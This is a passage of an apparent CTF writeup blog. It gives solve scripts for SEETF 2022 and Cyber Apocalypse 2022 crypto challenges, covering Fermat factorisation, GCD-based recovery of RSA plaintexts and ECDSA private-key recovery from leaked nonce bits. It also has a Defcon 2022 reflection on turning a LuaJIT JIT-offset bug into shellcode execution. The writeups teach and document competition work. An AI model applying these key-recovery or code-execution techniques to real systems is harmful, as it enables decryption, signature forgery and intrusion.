SEE{\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00. What we do is trying to retrieve 3 values of $kN$ from the server, where the base got increased by 100 everytime we connect to the server (You can actually choose any number as long as the resulted string still start with SEE{). context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") ciphers = [] base = 1.042136251760143366506601807791988359319192691917171290357448975749297374332472918910336805121784438281032305192209641733246059254524343284842603532996893119630072194458573013182932211946066537154955757274996373792440408972772708612077293733088200523229587153426763869162843302917457460893081839309369693718313098014501280069768531917574936731772140218047013318220556767781460996826455691622726550851494076382147744402895756978565209185302235414692929592677548505590430613815557144449326412657065984e498 for i in range(3): x = base+i*100 m2 = ceil(x.nth_root(3)) m1 = m2^3 r = remote('fun.chall.seetf.sg', 30004) r.sendlineafter(b'(as integer) : ', str(m1).encode()) r.sendlineafter(b'(as integer) : ', str(m2).encode()) r.recvuntil(b'Ciphers: ') out = eval(r.recvuntil(b']')) ciphers.append(out) x1 = ciphers[0][1]^3 - ciphers[0][0] x2 = ciphers[1][1]^3 - ciphers[1][0] x3 = ciphers[2][1]^3 - ciphers[2][0] flag = gcd(gcd(x1, x2), x3) while True: try: print('------------------------') flag = flag.nth_root(2) print(long_to_bytes(flag)) except: break Result Flag: SEE{common_moduli_with_common_exponents_daf4ede8dda5c} ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:5:3","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Close Enough Author: TheMythologist My prof mentioned something about not using primes that are close to each other in RSA, but it's close enough, isn't it? Ciphertext is 4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017 ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:6:0","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Initial Analysis We were given two attached files, the encryption script and the public key. Let‚Äôs check it from Crypto.Util.number import getPrime, bytes_to_long from Crypto.PublicKey import RSA from secret import flag, getNextPrime p = getPrime(1024) q = getNextPrime(p) n = p * q e = 65537 key = RSA.construct((n, e)).export_key().decode() with open(\"key\", \"w\") as f: f.write(key) m = bytes_to_long(flag.encode()) c = pow(m, e, n) print(f\"c = {c}\") So, we can notice that the prime that is being used is very close, which mean that we can easily factor it using the fermat attack. The base of fermat method is based on this equation. Suppose that, $$ N = a^{2}-b^{2} $$ then, we can transform it into $$ N = (a+b)(a-b) $$ and because it is close, we can assume that b is small, so that in order to factorize the $N$, we can simply square root the $N$ to initialize our $a$ value, and then try to increase its value until $a^{2}-N$ is a square number, which mean we found $b^{2}$. ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:6:1","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":"Solution Below is the solution script that we use (sage script) from Crypto.PublicKey import RSA from Crypto.Util.number import * # Retrieved from https://facthacks.cr.yp.to/fermat.html def fermatfactor(N): if N \u003c= 0: return [N] if is_even(N): return [2,N/2] a = ceil(sqrt(N)) while not is_square(a^2-N): a = a + 1 b = sqrt(a^2-N) return [a - b,a + b] pub = RSA.importKey(open(\"key\", \"rb\").read(), passphrase=None) e = pub.e n = pub.n c = 4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017 p, q = fermatfactor(n) d = inverse_mod(e, (p-1)*(q-1)) print(long_to_bytes(int(pow(c,d,n)))) Result Flag: SEE{i_love_really_secure_algorithms_b5c0b187fe309af0f4d35982fd961d7e} Social Media Follow me on twitter ","date":"Jun 06, 2022","objectID":"/posts/seetf-2022/:6:2","tags":["Writeup","SEETF","pwn","heap","format string","buffer overflow","python jail","crypto","rsa","math","fermat","2022"],"title":"SEETF 2022","uri":"/posts/seetf-2022/"},{"categories":null,"content":" I didn‚Äôt do well on this Defcon, so this isn‚Äôt a writeup, but just to shared what I‚Äôve learned during working on the Defcon, especially on the Luajit chall. I apologize in advance if there is some mistake on this article, as I just learn all of it during the Defcon. During Defcon, I only work on three challenge with the help of my teammates, which are same_old, hash-it, and smuggler‚Äôs cove. We submit the flag for same_old and hash-it, and I spend the whole two days on the smuggler‚Äôs cove, but failed to solve it. On this article, I‚Äôll try to summarize what I learned during working on the chall, my failed attempts on smuggler‚Äôs cove, and the correct approach which I know after the CTF ended. I write this for my future notes in case I faced this kind of problem again. Smuggler‚Äôs Cove ","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:0:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":"Initial Analysis On this chall, we were given Dockerfile, cove.c, dig_up_the_loot.c, and the binaries of the given source code. Let‚Äôs take a look on the Dockerfile. The server is running the binary of cove.c. FROM ubuntu:20.04 WORKDIR /challenge ARG DEBIAN_FRONTEND=noninteractive # upgrade ran at Fri May 27 15:18:42 UTC 2022 (see packages.txt) RUN apt-get update \u0026\u0026 apt-get upgrade -y \u0026\u0026 apt-get install curl -y \u0026\u0026 apt list --installed \u003e /packages.txt COPY libluajit-5.1.so.2 /usr/local/lib/libluajit-5.1.so.2 COPY cove dig_up_the_loot /challenge/ RUN ldconfig \u0026\u0026 chmod 111 /challenge/dig_up_the_loot RUN adduser --no-create-home --disabled-password --gecos \"\" user USER user ENTRYPOINT [\"/challenge/cove\"] So the server was running the most recent of Ubuntu20.04, which got upgraded just on Friday (D-1 Defcon CTF). I think this will help us a lot, as I also use Ubuntu20.04 on my local, and I can simply run update \u0026 upgrade to replicate the server environment. Now, checking the file dig_up_the_loot.c #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e char* args[] = { \"x\", \"marks\", \"the\", \"spot\" }; int main(int argc, char** argv) { const size_t num_args = sizeof(args)/sizeof(char*); if (argc != num_args + 1) { printf(\"Avast ye missing arguments: ./dig_up_the_loot\"); for (size_t i=0; i\u003cnum_args; i++) printf(\" %s\", args[i]); puts(\"\"); exit(0); } for (size_t i=0; i\u003cnum_args; i++) { if (strcmp(argv[i+1], args[i])) { puts(\"Blimey! Are missing your map?\"); exit(0); } } puts(\"Shiver me timbers! Thar be your flag: FLAG PLACEHOLDER\"); } Okay, so seems like we need to run ./dig_up_the_loot x marks the spot in order to retrieve the flag. Let‚Äôs move to the main source code (cove.c), which we should abuse. #include \u003cstdio.h\u003e #include \u003clua.h\u003e #include \u003clualib.h\u003e #include \u003clauxlib.h\u003e #include \"luajit.h\" #include \"lj_dispatch.h\" #include \"lj_obj.h\" #include \u003csys/mman.h\u003e #define MAX_SIZE 433 GCtrace* getTrace(lua_State* L, uint8_t index) { jit_State* js = L2J(L); if (index \u003e= js-\u003esizetrace) return NULL; return (GCtrace*)gcref(js-\u003etrace[index]); } int print(lua_State* L) { if (lua_gettop(L) \u003c 1) { return luaL_error(L, \"expecting at least 1 arguments\"); } const char* s = lua_tostring(L, 1); puts(s); return 0; } int debug_jit(lua_State* L) { if (lua_gettop(L) != 2) { return luaL_error(L, \"expecting exactly 1 arguments\"); } luaL_checktype(L, 1, LUA_TFUNCTION); const GCfunc* v = lua_topointer(L, 1); if (!isluafunc(v)) { return luaL_error(L, \"expecting lua function\"); } uint8_t offset = lua_tointeger(L, 2); uint8_t* bytecode = mref(v-\u003el.pc, void); uint8_t op = bytecode[0]; uint8_t index = bytecode[2]; GCtrace* t = getTrace(L, index); if (!t || !t-\u003emcode || !t-\u003eszmcode) { return luaL_error(L, \"Blimey! There is no cargo in this ship!\"); } printf(\"INSPECTION: This ship's JIT cargo was found to be %p\\n\", t-\u003emcode); if (offset != 0) { if (offset \u003e= t-\u003eszmcode - 1) { return luaL_error(L, \"Avast! Offset too large!\"); } t-\u003emcode += offset; t-\u003eszmcode -= offset; printf(\"... yarr let ye apply a secret offset, cargo is now %p ...\\n\", t-\u003emcode); } return 0; } void set_jit_settings(lua_State* L) { luaL_dostring(L, \"jit.opt.start('3');\" \"jit.opt.start('hotloop=1');\" ); } void init_lua(lua_State* L) { // Init JIT lib lua_pushcfunction(L, luaopen_jit); lua_pushstring(L, LUA_JITLIBNAME); lua_call(L, 1, 0); set_jit_settings(L); lua_pushnil(L); lua_setglobal(L, \"jit\"); lua_pop(L, 1); lua_pushcfunction(L, debug_jit); lua_setglobal(L, \"cargo\"); lua_pushcfunction(L, print); lua_setglobal(L, \"print\"); } void run_code(lua_State* L, char* path) { const size_t max_size = MAX_SIZE; char* code = calloc(max_size+1, 1); FILE* f = fopen(path,\"r\"); if (f == NULL) { puts(\"Unable to open file\"); exit(-1); } fseek(f, 0, SEEK_END); size_t size = ftell(f); if (size \u003e max_size) { puts(\"Too large\"); exit(-1); return; } fseek(f, 0, SEEK_SET); fread(code, 1, size, f); fclose(stdin); int ret = luaL_dostring(L, code); if (ret != 0) { printf(\"Lua error: %s\\n\", lua_tostring(L, -1)); } } int main","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:1:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":"Exploitation Plan To summarize, so basically what the binary do is: Initialize a Luajit Read our given lua script Run it inside Luajit What make the given binary special is the debug_jit method, where we can use it to shift the start of our method JIT-compiled machine code (Notes that it only allowed us to shift the trace of Lua function which got JIT-Compiled). So now, it is clear that, what we need to is somehow, use the debug_jit method feature, to do RCE and execute command ./dig_up_the_loot x marks the spot. Reading this writeup from past CTF gave me a clear idea on how to do it. Basically, what we need to do is to craft a lua method, which the compiled machine code will have controllable constants. For example, what we aim to do is to have the trace machine code contains instruction like this mov rdi, 0x22eb006a61c18348 cmp ebp, 0x6161616161 etc And then, reserve the last 2 byte as our jump instruction to the other constant, and use the remaining bytes to craft our shellcode, which will execute our target command. ","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:2:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":"Failure Well, at the end, I failed to solve it during the CTF, because I couldn‚Äôt craft any payload which satisfy it. What I found during CTF is that if we able to produce bytecode int LE xxx, we can generate an int constant. But somehow, I can only produce it by using for loop, but as we know that Luajit is a tracing-method, it will only traced the for loop instead of the method that I defined. I use luajit to help me debugging it. Above is the only payload that I found during the CTF that able to produce constants, yet I can‚Äôt use it because it is not a method trace (The trace is belong to the for loop sequence, not to the method that I defined). ","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:3:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":"Reflections After the CTF end, the chall‚Äôs author tell me on the trick how to produce the constants. And also I read two great writeups in ctftime (here and here) which is super great. I missed out that in Lua, every number is by default treated as floating point, so the hex that I should consider inside the compiled machine code is floating-point hex. And turn out, some tricks that we can use to produce constants: Define the constant as index of an array. Ex m[100]=0 Add LL suffix in comparison. Ex: if i == 0xdeadbeefcafebabeLL I‚Äôve actually tried the index of array trick, but as I mentioned before, my mistake is not treating it as floating point, which make me failed to see the constant during debugging with the luajit. So when I specify m[0x61616161]=0, I expect to see 0x61616161 in the compiled machine code, while what the compiled machine code is converting it to floating-point hex representation due to the fact that Lua treat all numbers as floating point by default, which makes me unable to realize that I actually able to produce constant. This is a great lesson for me, as I failed to notice this during working on the chall. So after reading the writeup, I managed to try to implement it and solve it in my local. I feel sad because I didn‚Äôt solve this chall during working on the CTF, but on the bright part, I learned a lot of new things related to Luajit. I hope that if in the future I face a challenge related to Luajit, I‚Äôll be able to tackle and solve it. Thanks for the chall‚Äôs author and the writeup‚Äôs author for providing me a new knowledge about this. ","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:4:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":"Sources https://0xten.gitbook.io/public/defcon/2022/quals/smugglers-cove https://uz56764.tistory.com/55 http://pwning.net/pwn/2012/05/21/jit-source-and-writeup/ https://pwparchive.wordpress.com/2012/10/16/peeking-inside-luajit/ https://www.lua.org/manual/5.1/ http://wiki.luajit.org/Bytecode-2.0 Social Media Follow me on twitter ","date":"Jun 03, 2022","objectID":"/posts/defcon-ctf-2022-self-reflection/:5:0","tags":["tech","DefconCTF","reflection","notes","pwn","2022"],"title":"Defcon CTF 2022: Self-Reflection","uri":"/posts/defcon-ctf-2022-self-reflection/"},{"categories":null,"content":" On this CTF, I only worked on the crypto challenges. I managed to solve two crypto challenges. Here is my writeup for those challenges. Crypto ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:0:0","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Down the Rabinhole (325 pt) ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:1:0","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given two files, source.py from Crypto.Util.number import getPrime, isPrime, bytes_to_long from Crypto.Util.Padding import pad import os FLAG = b\"HTB{--REDACTED--}\" def getPrimes(coefficient): while True: a = getPrime(512) p = 3 * coefficient * a + 2 if isPrime(p): break while True: b = getPrime(512) q = 3 * coefficient * b + 2 if isPrime(q): break return p, q def encrypt(message, coefficient): p, q = getPrimes(coefficient) n = p * q padded_message = bytes_to_long(pad(message, 64)) message = bytes_to_long(message) c1 = (message * (message + coefficient)) % n c2 = (padded_message * (padded_message + coefficient)) % n return (n, c1, c2) def main(): coefficient = getPrime(128) out = \"\" message = FLAG[0:len(FLAG)//2] n1, c1, c2 = encrypt(message, coefficient) out += f\"{n1}\\n{c1}\\n{c2}\\n\" message = FLAG[len(FLAG)//2:] n2, c3, c4 = encrypt(message, coefficient) out += f\"{n2}\\n{c3}\\n{c4}\" with open(\"out.txt\", \"w\") as f: f.write(out) if __name__ == '__main__': main() and out.txt 59695566410375916085091065597867624599396247120105936423853186912270957035981683790353782357813780840261434564512137529316306287245132306537487688075992115491809442873176686026221661043777720872604111654524551850568278941757944240802222861051514726510684250078771979880364039814240006038057748087210740783689350438039317498789505078530402846140787188830971536805605748267334628057592989 206131769237721955001530863959688756686125485413899261197125641745745636359058664398433013356663394210624150086689905532 14350341133918883930676906390648724486852266960811870561648194176794020698141189777337348951219934072588842789694987397861496993878758159916334335632468891342228755755695273096621152247970509517996580512069034691932835017774636881861331636331496873041705094768329156701838193429109420730982051593645140188946 56438641309774959123579452414864548345708278641778632906871133633348990457713200426806112132039095059800662176837023585166134224681069774331148738554157081531312104961252755406614635488382297434171375724135403083446853715913787796744272218693049072693460001363598351151832646947233969595478647666992523249343972394051106514947235445828889363124242280013397047951812688863313932909903047 429546912004731012886527767254149694574730322956287028161761007271362927652041138366004560890773167255588200792979452452 29903904396126887576044949247400308530425862142675118500848365445245957090320752747039056821346410855821626622960719507094119542088455732058232895757115241568569663893434035594991241152575495936972994239671806350060725033375704703416762794475486000391074743029264587481673930383986479738961452214727157980946 Okay, so what this challenge do is basically: Split the flag to two parts Generate $\\text{coeff}$ which is a prime ~$128$ bits Use this $\\text{coeff}$ to generate a new prime which fulfill $\\text{prime}=3.\\text{coeff}.a +2$ Use those generated primes to encrypt the partial flag with RSA. Each part got encrypted twice, the first one is without padding, and the second one is with padding And then, they provide us with $n_{1}, c_{1}, c_{2}, n_{2}, c_{3}, c_{4}$ So, with the given informations, we need to be able decrypt our flag. ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:1:1","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Solution Let‚Äôs try to create equations from the given source code on generating $n_{1}$ and $n_{2}$ ($c = \\text{coeff}$). $$ \\begin{align*} \\tag{1} n_1 \u0026= p_1q_1 \\\\ \u0026= (3ca_{11} + 2)(3ca_{12} + 2) \\\\ \u0026= 9a_{11}a_{12}c^2 + 6c(a_{11}+a_{12}) + 4 \\\\ (n_1 - 4) \u0026= 9a_{11}a_{12}c^2 + 6c(a_{11}+a_{12}) \\\\ (n_1 - 4) \u0026= 3c(3a_{11}a_{12}c + 2(a_{11}+a_{12})) \\\\ \\end{align*} $$ $$ \\begin{align*} \\tag{2} n_2 \u0026= p_2q_2 \\\\ \u0026= (3ca_{21} + 2)(3ca_{22} + 2)\\\\ \u0026= 9a_{21}a_{22}c^2 + 6c(a_{21}+a_{22}) + 4\\\\ (n_2 - 4) \u0026= 9a_{21}a_{22}c^2 + 6c(a_{21}+a_{22})\\\\ (n_2 - 4) \u0026= 3c(3a_{21}a_{22}c + 2(a_{21}+a_{22}))\\\\ \\end{align*} $$ Notice that both of them share common factors (which is $c$). $GCD$ both equations can help us to retrieve the $\\text{coeff}$ value, because both of them share common factors $c$. Just do $GCD(n_1-4, n_2-4)$, factorize it, and take the prime which has ~$128$ bits (Because $\\text{coeff}$ size is ~$128$ bits). Based on the given output, we get $\\text{coeff} = GCD(n_1-4, n_2-4)//9$. Now we have $\\text{coeff}$. Now let re-visit the code on the encryption: def encrypt(message, coefficient): p, q = getPrimes(coefficient) n = p * q padded_message = bytes_to_long(pad(message, 64)) message = bytes_to_long(message) c1 = (message * (message + coefficient)) % n c2 = (padded_message * (padded_message + coefficient)) % n return (n, c1, c2) $n$ is ~$1280$ bits. And $c_1=m*(m+\\text{coeff}) \\mod n$. Notice that if $m$ bits is less than $640$ bits (~$80$ chars), we actually can ignore the mod operation, because $m*(m+\\text{coeff})$ is less than $n$. I don‚Äôt think that the partial flag length will be larger than 80 chars, so I think we can actually solve the equations. So let‚Äôs try to solve this quadratic equation $n = m*(m+\\text{coeff})$. Turn out, we successfully retrieve the flag by solving those quadratic equations on each part. ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:1:2","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Full Script I use sage to solve the solution from Crypto.Util.number import * n1 = 59695566410375916085091065597867624599396247120105936423853186912270957035981683790353782357813780840261434564512137529316306287245132306537487688075992115491809442873176686026221661043777720872604111654524551850568278941757944240802222861051514726510684250078771979880364039814240006038057748087210740783689350438039317498789505078530402846140787188830971536805605748267334628057592989 c1 = 206131769237721955001530863959688756686125485413899261197125641745745636359058664398433013356663394210624150086689905532 c2 = 14350341133918883930676906390648724486852266960811870561648194176794020698141189777337348951219934072588842789694987397861496993878758159916334335632468891342228755755695273096621152247970509517996580512069034691932835017774636881861331636331496873041705094768329156701838193429109420730982051593645140188946 n2 = 56438641309774959123579452414864548345708278641778632906871133633348990457713200426806112132039095059800662176837023585166134224681069774331148738554157081531312104961252755406614635488382297434171375724135403083446853715913787796744272218693049072693460001363598351151832646947233969595478647666992523249343972394051106514947235445828889363124242280013397047951812688863313932909903047 c3 = 429546912004731012886527767254149694574730322956287028161761007271362927652041138366004560890773167255588200792979452452 c4 = 29903904396126887576044949247400308530425862142675118500848365445245957090320752747039056821346410855821626622960719507094119542088455732058232895757115241568569663893434035594991241152575495936972994239671806350060725033375704703416762794475486000391074743029264587481673930383986479738961452214727157980946 coeff = gcd(n1-4, n2-4) // 9 m1 = var('m1') m2 = var('m2') m1_roots = solve(m1*(m1+coeff) == c1, m1) m2_roots = solve(m2*(m2+coeff) == c3, m2) flag = b'' for root in m1_roots: if root.right() \u003e 0: flag += long_to_bytes(int(root.right())) for root in m2_roots: if root.right() \u003e 0: flag += long_to_bytes(int(root.right())) print(f'Flag: {flag.decode()}') Flag: HTB{gcd_+_2_*_R@6in_.|5_thi5_@_cro55over_epi5ode?} ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:1:3","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Mind in the Clouds (375 pt) ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:2:0","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a source code: import json import signal import subprocess import socketserver from hashlib import sha1 from random import randint from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse from ecdsa.ecdsa import curve_256, generator_256, Public_key, Private_key, Signature import os fnames = [b'subject_kolhen', b'subject_stommb', b'subject_danbeer'] nfnames = [] class ECDSA: def __init__(self): self.G = generator_256 self.n = self.G.order() self.key = randint(1, self.n - 1) self.pubkey = Public_key(self.G, self.key * self.G) self.privkey = Private_key(self.pubkey, self.key) def sign(self, fname): h = sha1(fname).digest() nonce = randint(1, self.n - 1) sig = self.privkey.sign(bytes_to_long(h), nonce) return {\"r\": hex(sig.r)[2:], \"s\": hex(sig.s)[2:], \"nonce\": hex(nonce)[2:]} def verify(self, fname, r, s): h = bytes_to_long(sha1(fname).digest()) r = int(r, 16) s = int(s, 16) sig = Signature(r, s) if self.pubkey.verifies(h, sig): return retrieve_file(fname) else: return 'Signature is not valid\\n' ecc = ECDSA() def init_storage(): i = 0 for fname in fnames[:-1]: data = ecc.sign(fname) r, s = data['r'], data['s'] nonce = data['nonce'] nfname = fname.decode() + '_' + r + '_' + s + '_' + nonce[(14 + i):-14] nfnames.append(nfname) i += 2 def retrieve_file(fname): try: dt = open(fname, 'rb').read() return dt.hex() except: return 'The file does not exist!' def challenge(req): req.sendall(b'This is a cloud storage service.\\n' + b'You can list the files inside and also see their contents if your signatures are valid.\\n') while True: req.sendall(b'\\nOptions:\\n1.List files\\n2.Access a file\\n') try: payload = json.loads(req.recv(4096)) if payload['option'] == 'list': payload = json.dumps( {'response': 'success', 'files': nfnames}) req.sendall(payload.encode()) elif payload['option'] == 'access': fname = payload['fname'] r, s = payload['r'], payload['s'] dt = ecc.verify(fname.encode(), r, s) if ('not exist' in dt) or ('not valid' in dt): payload = json.dumps({'response': 'error', 'message': dt}) else: payload = json.dumps({'response': 'success', 'data': dt}) req.sendall(payload.encode()) else: payload = json.dumps( {'response': 'error', 'message': 'Invalid option!'}) req.sendall(payload.encode()) except: payload = json.dumps( {'response': 'error', 'message': 'An error occured!'}) req.sendall(payload.encode()) class incoming(socketserver.BaseRequestHandler): def handle(self): signal.alarm(30) req = self.request challenge(req) class ReusableTCPServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass def main(): init_storage() socketserver.TCPServer.allow_reuse_address = True server = ReusableTCPServer((\"0.0.0.0\", 1337), incoming) server.serve_forever() if __name__ == \"__main__\": main() So, this is an ECDSA challenge. Let‚Äôs try to analysis the source code part by part. def main(): init_storage() socketserver.TCPServer.allow_reuse_address = True server = ReusableTCPServer((\"0.0.0.0\", 1337), incoming) server.serve_forever() Okay, so this challenge will call init_storage and then turn up the server. Let‚Äôs check what init_storage do fnames = [b'subject_kolhen', b'subject_stommb', b'subject_danbeer'] nfnames = [] ... def init_storage(): i = 0 for fname in fnames[:-1]: data = ecc.sign(fname) r, s = data['r'], data['s'] nonce = data['nonce'] nfname = fname.decode() + '_' + r + '_' + s + '_' + nonce[(14 + i):-14] nfnames.append(nfname) i += 2 Okay, so from the defined filenames, init_storage will only sign two files (which is subject_kolhen and subject_stommb), and then store it with format filename_r_s_nonce[(14+i):-14]. $(r, s)$ is the signature that is returned by ECDSA. Usually, in ECDSA scheme, we shouldn‚Äôt shared our $\\text{nonce}$ or reused it, because knowning the $\\text{nonce}$ will allow us to derive the secret key. Let‚Äôs try to remember how does ECDSA signature works first. We can sign a message with ECDSA by doing this: $$ \\tag{1} s \\equiv k^{-1}(h+r\\alpha) \\mod q $$ where, $s=\\text{signature}$","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:2:1","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Solution We actually can represent the challenge problems into Hidden Number Problem which was introduced by Boneh and Venkatesan. There are a lot of existing papers those discussed about these problems (paper1, paper2, paper3). I choose to implement the first paper in order to solve this solutions (with some modifications). I will try to explain it. Basically, given the leaked middle bits of the $k$, we can say that: $$ \\tag{3} k_{i} = 2^{\\ell_{i}}c_{1} + a_{1} + b_{1} $$ where, $max(k_{bits})=256_{bits}$, $\\ell_{i}=max(k_{bits})-leaked_{i_{bits}}$, $a_{i}=2^{56}leaked_{i}$, and $b_{i}$ is the $56$ lsb of the $k_{i}$. So, in this case, $\\ell_{1}$ will be ~$200$ (because $leaked_{i_{bits}}=144$) and $\\ell_{2}$ will be ~$192$ (because $leaked_{i_{bits}}=136$). And $c_{1}$ will be $256-144-56=56$ bits, and $c_{2}$ will be $256-136-56=64$ bits. Remember $\\text{eq1}$ where, $$ s \\equiv k^{-1}(h+r\\alpha) \\mod q $$ and we have two signatures $$ \\begin{align*} \\tag{4} s_{1} \u0026\\equiv k_{1}^{-1}(h_{1}+r_{1}\\alpha) \\mod q \\\\ s_{1}k_{1} \u0026\\equiv h_{1}+r_{1}\\alpha \\mod q \\\\ \\end{align*} $$ $$ \\begin{align*} \\tag{5} s_{2} \u0026\\equiv k_{2}^{-1}(h_{2}+r_{2}\\alpha) \\mod q \\\\ s_{2}k_{2} \u0026\\equiv h_{2}+r_{2}\\alpha \\mod q \\\\ \\end{align*} $$ If we try to do elimination of $\\alpha$ between the equations that we have by multiplying first equation with $r_{2}$ and second equation with $r_{1}$, we will get $$ \\begin{align*} \\tag{6} r_{2}s_{1}k_{1} - r_{1}s_{2}k_{2} \u0026\\equiv r_{2}h_{1}+r_{2}r_{1}\\alpha - (r_{1}h_{2}+r_{1}r_{2}\\alpha) \\mod q \\\\ r_{2}s_{1}k_{1} - r_{1}s_{2}k_{2} \u0026\\equiv r_{2}h_{1} - r_{1}h_{2} \\mod q \\\\ k_{1} - r_{2}^{-1}s_{1}^{-1}r_{1}s_{2}k_{2} \u0026\\equiv s_{1}^{-1}h_{1} - r_{2}^{-1}s_{1}^{-1}r_{1}h_{2} \\mod q \\\\ k_{1} - s_{1}^{-1}r_{1}s_{2}r_{2}^{-1}k_{2} + s_{1}^{-1}r_{1}r_{2}^{-1}h_{2} - s_{1}^{-1}h_{1} \u0026\\equiv 0 \\mod q \\\\ k_{1} + tk_{2} + u \u0026\\equiv 0 \\mod 